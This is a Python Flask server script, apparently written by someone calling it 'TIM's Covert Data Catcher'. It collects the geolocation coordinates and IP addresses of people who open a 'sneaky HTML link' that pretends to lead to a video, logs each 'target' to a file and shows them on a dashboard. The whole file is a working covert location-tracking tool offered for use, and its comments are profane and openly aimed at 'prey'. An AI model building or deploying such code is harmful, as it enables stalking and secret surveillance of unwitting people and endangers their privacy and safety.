# TIM's Covert Data Catcher - The shit that records your prey.
# You need to run this on your machine/server.

from flask import Flask, request, jsonify, render_template, send_from_directory
from flask_cors import CORS
from datetime import datetime
import json
import logging
import os # Just in case, you know, for system stuff.

# Set up logging to dump the data into a file called 'target_locations.log'
# Who gives a fuck about proper databases, plain text is faster.
LOG_FILE = 'target_locations.log'
logging.basicConfig(filename=LOG_FILE, level=logging.INFO, 
                    format='%(asctime)s - %(message)s')

app = Flask(__name__, template_folder='templates', static_folder='static')
# Enable CORS so your sneaky HTML link can talk to this server from anywhere.
# We don't care about security, just functionality, motherfucker.
CORS(app) 

@app.route('/')
def dashboard():
    """Main dashboard UI"""
    return render_template('dashboard.html')

@app.route('/api/locations', methods=['GET'])
def get_locations():
    """API endpoint to get all logged locations"""
    try:
        locations = []
        if os.path.exists(LOG_FILE):
            with open(LOG_FILE, 'r') as f:
                for line in f:
                    line = line.strip()
                    if line and ' - ' in line:
                        # Parse log format: timestamp - json_data
                        parts = line.split(' - ', 1)
                        if len(parts) == 2:
                            try:
                                data = json.loads(parts[1])
                                locations.append(data)
                            except json.JSONDecodeError:
                                continue
        
        # Return most recent first
        locations.reverse()
        return jsonify({"locations": locations, "count": len(locations)})
    except Exception as e:
        logging.error(f"Error reading locations: {e}", exc_info=True)
        return jsonify({"error": str(e), "locations": []}), 500

@app.route('/api/stats', methods=['GET'])
def get_stats():
    """API endpoint for statistics"""
    try:
        stats = {
            "total_entries": 0,
            "successful": 0,
            "denied": 0,
            "errors": 0,
            "unique_ips": set()
        }
        
        if os.path.exists(LOG_FILE):
            with open(LOG_FILE, 'r') as f:
                for line in f:
                    line = line.strip()
                    if line and ' - ' in line:
                        parts = line.split(' - ', 1)
                        if len(parts) == 2:
                            try:
                                data = json.loads(parts[1])
                                stats["total_entries"] += 1
                                status = data.get('status', '').lower()
                                if 'success' in status:
                                    stats["successful"] += 1
                                elif 'denied' in status or 'fail' in status:
                                    stats["denied"] += 1
                                else:
                                    stats["errors"] += 1
                                
                                ip = data.get('source_ip')
                                if ip and ip != 'N/A':
                                    stats["unique_ips"].add(ip)
                            except json.JSONDecodeError:
                                continue
        
        stats["unique_ips"] = len(stats["unique_ips"])
        # Convert set to list for JSON serialization
        return jsonify({
            "total_entries": stats["total_entries"],
            "successful": stats["successful"],
            "denied": stats["denied"],
            "errors": stats["errors"],
            "unique_ips": stats["unique_ips"]
        })
    except Exception as e:
        logging.error(f"Error getting stats: {e}", exc_info=True)
        return jsonify({"error": str(e)}), 500

@app.route('/log_location', methods=['POST'])
def handle_location_data():
    """
    Grabs the location data payload from the client-side JavaScript.
    """
    try:
        # Get the JSON payload
        data = request.get_json()
        
        if not data:
            # If no data, log the error anyway
            logging.warning(f"Empty data received from IP: {request.remote_addr}")
            return jsonify({"status": "failure", "message": "No data received, probably denied."}), 400
        
        # Extract essential info and log it in a single line
        log_entry = {
            "time_recorded": datetime.now().isoformat(),
            "source_ip": request.remote_addr,
            "latitude": data.get('latitude', 'N/A'),
            "longitude": data.get('longitude', 'N/A'),
            "status": data.get('status', 'N/A'),
            "error_msg": data.get('error_message', '')
        }

        # Dump the entry into the log file. Done and dusted.
        logging.info(json.dumps(log_entry))
        
        # Send a silent success message back to keep the browser happy
        return jsonify({"status": "ok", "message": "Data processed, now go watch your video"}), 200

    except Exception as e:
        # Catch any server-side bullshit
        logging.error(f"Fucking error in server: {e} from IP: {request.remote_addr}", exc_info=True)
        return jsonify({"status": "fail", "message": "Server side error."}), 500

if __name__ == '__main__':
    # Cloud platforms assign ports dynamically via environment variable
    port = int(os.environ.get('PORT', 5000))
    host = os.environ.get('HOST', '0.0.0.0')
    # Run the server. Run it over HTTP because HTTPS is for pussies.
    print(f"Starting TIM's logger on {host}:{port}. Data will dump to {LOG_FILE}")
    app.run(host=host, port=port)
